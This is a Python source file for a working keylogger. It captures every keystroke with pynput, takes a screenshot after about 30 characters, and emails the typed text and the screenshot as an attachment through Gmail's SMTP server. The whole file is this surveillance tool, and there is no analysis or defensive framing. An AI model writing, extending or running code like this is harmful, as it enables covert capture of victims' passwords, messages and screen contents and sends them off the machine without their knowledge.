# for captuing screenshot
import pyscreenshot
# for capturing key strokes
import pynput.keyboard
import getpass
# for sending mail with attachment
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

class keylogger:

    def __init__(self,email,email2,password):
        self.log = ""
        

    def screenshot(self):
        print("Taking Screenshot")
        image = pyscreenshot.grab()
        image.save("screenshot.jpg")
        self.mail("screenshot.jpg")
        

    
    def mail(self,file):
        print("Ready to mail",file)
        message = MIMEMultipart()

        message["From"] = email
        message["To"] = email2

        attachment = open(file,'rb')
        body = self.log
        message.attach(MIMEText(body,"plain"))
        obj = MIMEBase('application','octet-stream')
        obj.set_payload((attachment).read())
        encoders.encode_base64(obj)
        obj.add_header("Content-Disposition","attachment; filename= " + file)
        

        message.attach(obj)
        my_message = message.as_string()
        
        server=smtplib.SMTP_SSL('smtp.gmail.com',465)  #RUNS ON PORT 465
        server.login(email,password)
        print("Sending mail")
        server.sendmail(
            email,
            email2,
            my_message)
        self.log = ""
        server.quit()

    def addmessage(self,k):
        if(k==-1):
            self.log=self.log[:-1]
        else:
            self.log = self.log + k
        print(self.log)
        if(len(self.log)>30):
            print("Characters recorded")
            print("Now ready to take screenshot")
            self.screenshot()

    def process_key_press(self,key):
        
        try:
            k = str(key.char)
           
        except AttributeError:
            if key == key.space:
                k = " "
            elif(key==key.backspace):
                k=-1
            else:
                k = " " + (str(key)) + " "
                
        self.addmessage(k)

    def start(self):
        print("Ready to send")
        keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
        with keyboard_listener:
           keyboard_listener.join()

email=input("Please enter email address: ")
email2=email
password=getpass.getpass("Enter your password: ")
obj = keylogger(email,email2,password)
obj.start()
